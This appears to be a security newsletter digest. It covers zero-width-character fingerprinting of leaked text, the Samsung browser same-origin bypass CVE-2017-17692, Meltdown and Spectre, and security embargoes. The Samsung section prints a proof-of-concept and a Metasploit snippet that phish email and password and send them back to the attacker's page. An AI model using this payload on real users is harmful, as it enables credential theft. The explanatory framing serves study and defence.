Invisibly fingerprinting text
-----------------------------

From `Zach Aysan - Zero-Width Characters <https://www.zachaysan.com/writing/2017-12-30-zero-width-characters>`_:

  **Journalists watch out—you may be unintentionally revealing sources.**

  In early 2016 I realized that it was possible to use zero-width characters, like `zero-width non-joiner <https://en.wikipedia.org/wiki/Zero-width_non-joiner>`_ or other `zero-width characters <https://en.wikipedia.org/wiki/Zero-width_space>`_ like the zero-width space to fingerprint text. Even with just a single type of zero-width character the presence or non-presence of the non-visible character is enough bits to fingerprint even the shortest text.

  ...

  Unlike previous text fingerprinting techniques, zero-width characters are not removed when formatting is removed from text. They're often not even visible in contexts where software experts would expect them to be, like on a programming terminal.

  ...

  Countermeasures for journalists or others engaged with leakers, in decreasing order of effectiveness:

  #.  Avoid releasing excerpts and raw documents.
  #.  Get the same documents from multiple leakers to ensure they have the exact same content on a byte-by-byte level.
  #.  Manually retype excerpts to avoid invisible characters and homoglyphs.
  #.  Keep excerpts short to limit the amount of information shared.
  #.  Use a tool that strips non-whitelisted characters from text before sharing it with others.

The follow-up article `Text Fingerprinting Update <https://www.zachaysan.com/writing/2018-01-01-fingerprinting-update>`_ evaluates how the above techniques work against the technique of "Intentional typos and small changes to the text that most people wouldn't notice":

  #.  Avoid releasing excerpts and raw documents. **Works perfectly.**
  #.  Get the same documents from multiple leakers to ensure they have the exact same content on a byte-by-byte level. **Works perfectly.**
  #.  Manually retype excerpts to avoid invisible characters and homoglyphs. **Works unless careless.**
  #.  Keep excerpts short to limit the amount of information shared. **Works unless unlucky.**
  #.  Use a tool that strips non-whitelisted characters from text before sharing it with others.  **Doesn't work.**

  A few readers contacted me to bring to my attention various other characters that can be employed for this method, including the `en space <https://en.wikipedia.org/wiki/En_(typography)>`_, `figure space <https://en.wikipedia.org/wiki/Figure_space>`_, and `others <https://en.wikipedia.org/wiki/Whitespace_character>`_. Some reported seeing these used in the wild, though they declined to share their name publicly.


Exploits this week
==================


CVE-2017-17692 Samsung Internet Browser SOP Bypass
--------------------------------------------------

See `Samsung Internet Browser SOP Bypass - CVE-2017-17692 <https://datarift.blogspot.com/p/samsung-interent-browser-sop-bypass-cve.html>`_ for this exploit:

.. code-block:: html
  :emphasize-lines: 2,3,6-9,13

  <script>
    function go(){
      var x=window.open('https://www.google.com/csi');
      setTimeout(
        function(){
          x.document.body.innerHTML='<h1>Please login</h1>';
          a=x.prompt('E-mail','');
          b=x.prompt('Password','');
          alert('E-mail: '+a+'\nPassword: '+b)}
        ,3000);
    }
  </script>
  <button onclick="go()">go</button>

This results in the following:

#. When the user clicks :guilabel:`go`:

   #. The page is redirected to https://www.google.com/csi. (Go ahead and try it on your browser & look at the page source.)

   #. `setTimeout <https://www.w3schools.com/js/js_timing.asp>`_ creates a 3 second timeout with the callback ``function()``.

#. The callback does the following:

   #. Replaces the window's document with ``<h1>Please login</h1>``.

   #. Pops up a prompt for *E-mail* (and gets the value if entered).

   #. Pops up a prompt for *Password* (and gets the value if entered).

From `CVE-2017-17692: Same-Origin Policy (SOP) bypass vulnerability in the Samsung Internet Browser <https://securityonline.info/cve-2017-17692-sop-bypass-samsung/>`_:

  When an attacker manipulates a Javascript to open a new tab in a given domain name of the Samsung Internet Explorer (eg, google.com), the Javascript code rewrites the content of the page at will. This is a taboo in browser design because it means that attackers can violate the same-origin policy through Javascript and can be executed directly from one site (controlled by an attacker) and then at another site (the attacker is interested Follow-up. Essentially, if the victim takes the lead in accessing an attacker-controlled Web page, an attacker can not only insert custom Javascript code into any domain name but can also steal cookie sessions and read and write webmail in the user’s name.

Metasploit has a module (`metasploit-framework/modules/auxiliary/gather/samsung_browser_sop_bypass.rb <https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/samsung_browser_sop_bypass.rb>`_) where the timeout function does more:

.. code-block:: javascript
  :emphasize-lines: 2-5,8-9

  setTimeout(function(){
    x.document.body.innerHTML='<h1>404 Error</h1>'+
      '<p>Oops, something went wrong.</p>';
    a=x.prompt('E-mail','');
    b=x.prompt('Password','');
    var cred=JSON.stringify({'user':a,'pass':b});
    var xmlhttp = new XMLHttpRequest;
    xmlhttp.open('POST', window.location, true);
    xmlhttp.send(cred);
  }, 3000);


CPU Speculative Execution Attacks: Meltdown and Spectre
-------------------------------------------------------


Understanding CPU speculative execution
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Assuming an understanding of `Page table <https://en.wikipedia.org/wiki/Page_table>`_ and `Speculative execution <https://en.wikipedia.org/wiki/Speculative_execution>`_, the article `Negative Result: Reading Kernel Memory From User Mode <https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/>`_ describes how the memory subsystem works, then speculative execution, then abusing speculative execution. The idea is that speculative execution can affect a CPU cache, instruction timing can determine if something is in the cache, and knowing that something is or isn't in the cache is a side channel information leak.

From `F**CKWIT, aka KAISER, aka KPTI – Intel CPU flaw needs low-level OS patches <https://nakedsecurity.sophos.com/2018/01/03/fckwit-aka-kaiser-aka-kpti-intel-cpu-flaw-needs-low-level-os-patches/>`_:

  Back in July 2017, a German security researcher `did some digging <https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/>`_ to see if order does, in fact, matter.

  He wondered what would happen if the processor calculated some internal results as part of an illegal instruction X, used those internal results in handling legal instruction Y, and only then flagged X as disallowed.

  Even if both X and Y were cancelled as a result, would there be a trace of the internal result left over from the speculative execution of the illegal instruction X?

  If so, could you figure out something from that left-over trace?

  The example that the researcher started with looked like this:

  .. code-block:: text
    :linenos:

     mov rax, [K]      ; K is a kernel address that is banned
     and rax, 1
     mov rbx, [U+rax]  ; U is a user address that is allowed

  Don’t worry if you don’t speak assembler – what this code does is:

  * Load the A register from kernel memory.
  * Change A to 0 if it was even or 1 if it was odd (this keeps the thought experiment simple).
  * Load register B from memory location U+0 or U+1, depending on A. 

  In theory, speculative execution means that the CPU could finish working internally on instruction 3 before finishing instruction 1, even though the whole sequence of instructions would ultimately be invalidated and blocked because of the privilege violation in 1.

  Perhaps, however, the side-effects of instruction 3 could be figured out from elsewhere in the CPU?

  In other words, the cache might act as a “telltale”, known as a side channel, that could leak secret information from inside the CPU – in this case, whether the privileged value of memory location K was odd or even.

  (Looking up memory in CPU cache is some 40 times faster than fetching it from the actual memory chips, so enabling this sort of “short-circuit” for commonly-used values can make a huge difference to performance.)

  The long and the short of it is that the researcher couldn’t measure the difference between A is even and A is odd (or, alternatively, did the CPU peek at U or did the CPU peek at U+1) in this case…

   …but the thought experiment worked out in the end.

The actual details of the exploit can be found in `Reading privileged memory with a side-channel <https://googleprojectzero.blogspot.co.uk/2018/01/reading-privileged-memory-with-side.html>`_.

Also see `More details about mitigations for the CPU Speculative Execution issue <https://security.googleblog.com/2018/01/more-details-about-mitigations-for-cpu_4.html>`_:

  Project Zero discussed three variants of speculative execution attack. There is no single fix for all three attack variants; each requires protection independently.

  * Variant 1 (`CVE-2017-5753 <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5753>`_), “bounds check bypass.” This vulnerability affects specific sequences within compiled applications, which must be addressed on a per-binary basis.

  * Variant 2 (`CVE-2017-5715 <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5715>`_), “branch target injection”. This variant may either be fixed by a CPU microcode update from the CPU vendor, or by applying a software mitigation technique called “`Retpoline <https://support.google.com/faqs/answer/7625886>`_” to binaries where concern about information leakage is present. This mitigation may be applied to the operating system kernel, system programs and libraries, and individual software programs, as needed.

  * Variant 3 (`CVE-2017-5754 <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5754>`_), “rogue data cache load.” This may require patching the system’s operating system. For Linux there is a patchset called KPTI (Kernel Page Table Isolation) that helps mitigate Variant 3. Other operating systems may implement similar protections - check with your vendor for specifics.

Meltdown and Spectre papers
^^^^^^^^^^^^^^^^^^^^^^^^^^^

From `Meltdown and Spectre <https://spectreattack.com/>`_

  Meltdown and Spectre exploit critical vulnerabilities in modern processors. These hardware bugs allow programs to steal data which is currently processed on the computer. While programs are typically not permitted to read data from other programs, a malicious program can exploit Meltdown and Spectre to get hold of secrets stored in the memory of other running programs. This might include your passwords stored in a password manager or browser, your personal photos, emails, instant messages and even business-critical documents.

  Meltdown and Spectre work on personal computers, mobile devices, and in the cloud. Depending on the cloud provider's infrastructure, it might be possible to steal data from other customers.

From the Meltdown academic paper:

  Meltdown allows an adversary who can run code on the vulnerable processor to obtain a dump of the entire kernel address space, including any mapped physical memory. The  root  cause  of  the  simplicity  and  strength  of  Meltdown are side effects caused by *out-of-order execution*.

  Out-of-order  execution  is  an  important  performance feature of today’s processors in order to overcome latencies of busy execution units,  e.g., a memory fetch unit needs to wait for data arrival from memory. Instead of stalling the execution, modern processors run operations *out-of-order* i.e., they look ahead and schedule subsequent  operations to idle execution units of the processor. However, such operations often have unwanted side-effects, e.g., timing differences ... can leak information from both sequential and out-of-order execution.

  However, we observed that out-of-order memory lookups influence the cache, which in turn can be detected through the cache side channel. As a result, an attacker can dump the entire kernel memory by reading privileged memory in an out-of-order execution stream, and transmit the data from this elusive state via a microarchitectural covert channel (e.g., Flush+Reload) to the outside world. On the receiving end of the covert channel, the register value is reconstructed. Hence, on the microarchitectural level (e.g., the actual hardware implementation), there is an exploitable security problem.

  Meltdown allows an unprivileged process to read data mapped in the kernel address space, including the entire physical memory on Linux and OS X, and a large fraction of the physical memory on Windows. This may include physical memory of other processes, the kernel, and in case of kernel-sharing sandbox solutions (e.g., Docker, LXC) or Xen in paravirtualization mode, memory of the kernel (or hypervisor), and other co-located instances.

  Our evaluation shows that KAISER prevents Meltdown to a large extent.

  Meltdown is distinct from the Spectre Attacks ... in several ways, notably that Spectre requires tailoring to the victim process’s software environment, but applies more broadly to CPUs and is not mitigated by KAISER.

  **Contributions.** The contributions of this work are:

  #. We describe out-of-order execution as a new, extremely powerful, software-based side channel.

  #. We show how out-of-order execution can be combined with a microarchitectural covert channel to transfer the data from an elusive state to a receiver on the outside.

  #. We present an end-to-end attack combining out-of-order execution with exception handlers or TSX, to read arbitrary physical memory without any permissions or privileges, on laptops, desktop machines, and on public cloud machines.

  #. We evaluate the performance of Meltdown and the effects of KAISER on it.

From the Spectre academic paper:

  While makeshift processor-specific countermeasures are possible in some cases, sound solutions will require fixes to processor designs as well as updates to instruction set architectures (ISAs) to give hardware architects and software developers a common understanding as to what computation state CPU implementations are (and are not) permitted to leak.

  In this paper, we show a new class of microarchitectural attacks which we call Spectre attacks. At a high level, Spectre attacks trick the  processor  into  speculatively  executing  instructions sequences that should not have executed during correct program execution. As the effects of these instructions on the nominal CPU state will be eventually reverted, we call them transient instructions. By carefully choosing which transient instructions are speculatively executed, we are able to leak information from within the victim’s memory address space.
  We empirically demonstrate the feasibility of Spectre attacks by using transient instruction sequences in order to leak information across security domains.

It's not just Intel:

  Using the practice of responsible disclosure, we have disclosed a preliminary version of our results to Intel, AMD,ARM, Qualcomm as well as to other CPU vendors. We have also contacted other companies including Amazon, Apple, Microsoft, Google and others. The Spectre family of attacks is documented under CVE-2017-5753 and CVE-2017-5715.

Furthermore:

  Meltdown is distinct from Spectre Attacks in two main ways. First, unlike Spectre, Meltdown does not use branch prediction for achieving speculative execution. Instead, it relies on the observation that when an instruction causes a trap, following instructions that were executed out-of-order are aborted. Second, Meltdown exploits a privilege escalation vulnerability specific to Intel processors, due to which speculatively executed instructions can bypass memory protection. Combining these issues, Meltdown accesses kernel memory from user space. This access causes a trap, but before the trap is issued, the code that follows the access leaks the contents of the accessed memory through a cache channel.
  Unlike Meltdown, the Spectre attack works on non-Intel processors, including AMD and ARM processors. Furthermore, the KAISER patch ..., which has been widely applied as a mitigation to the Meltdown attack, does not protect against Spectre.


Security embargo
^^^^^^^^^^^^^^^^

This issue points out the importance of understanding the concept of embargoed security bugs. From `fedora wiki - Security Bugs <https://fedoraproject.org/wiki/Security_Bugs>`_ `fedora wiki - Security Bugs - Embargoed Security Issues <https://fedoraproject.org/wiki/Security_Bugs#Embargoed_Security_Issues>`_:

  An embargoed security issue is one which is not publicly known, and its existence is to be reported to responsible organizations. Often when a researcher discovers a security issue, they will contact an organization such as vendor sec or the project's upstream developers. If the issue is of great severity, it is wise to give the upstream project, various distribution vendors, and the researcher some time to produce patches and advisories for the issue. That means setting a date sometime in the future which all parties can agree upon.

  When entering an embargoed issue in the Red Hat Bugzilla, please check the "Security Sensitive Bug" check-box to ensure that the information being entered is not publically viewable until the embargo date passes. These bugs will only be viewable by certain Red Hat employees, the reporter, and anyone in the CC field. 

  .. warning::

     While a security bug is under embargo, you should not push your fixes to Fedora GIT repository (or upstream version control repositories) because that would disclose details about the bug prematurely. But you are welcome to prepare a patch fixing the issues, and attach it to the Bugzilla bug.

     When in doubt, please contact `Red Hat Product Security <secalert@redhat.com>`_.

Of course vendors have a security problem response process, like `Xen Security Problem Response Process <https://www.xenproject.org/security-policy.html>`_.

`LWN.net <https://lwn.net/>`_ 2012 article discusses `How long should security embargoes be? <https://lwn.net/Articles/479936/>`_:

  Security embargoes are something of a double-edged sword. The idea is to coordinate a release date for a particular security fix between the affected parties (typically distributions in the Linux world). But, while the embargo is in place, no fixes are being issued which increases the length of time that users are vulnerable. That could lead to widespread—or targeted—attacks against vulnerable systems if the flaw is already known, is leaked, or is rediscovered during the embargo period. The chances of that may be relatively small, but they certainly increase as a function of the length of the embargo.

  It is for those reasons that embargoes in the Linux world are typically short. While proprietary vendors will sometimes sit on a vulnerability for months, Linux embargoes are generally on the order of a week or two. The rules for the acceptable length of an embargo are set by the venue where the information is shared, which for Linux distributions is the closed `linux-distros <http://oss-security.openwall.org/wiki/mailing-lists/distros>`_ mailing list. There is also an associated distros mailing list which also adds in representatives from some of the BSDs. These two lists have taken the place of the vendor-sec list that was `compromised <https://lwn.net/Articles/431808/>`_ in March 2011.

Note that not all operating systems are included in the embargoes. From `Meltdown, aka "Dear Intel, you suck" <https://marc.info/?l=openbsd-tech&m=151521435721902&w=2>`_:

  We have received \*no\* non-public information.  I've seen posts elsewhere by other \*BSD people implying that they receive little or no prior warning, so I have no reason to believe this was specific to OpenBSD and/or our philosophy.  Personally, I do find it....amusing? that public announcements were moved up after the issue was deduced from development discussions and commits to a different open source OS project.  Aren't we all glad that this was under embargo and strongly believe in the future value of embargoes?
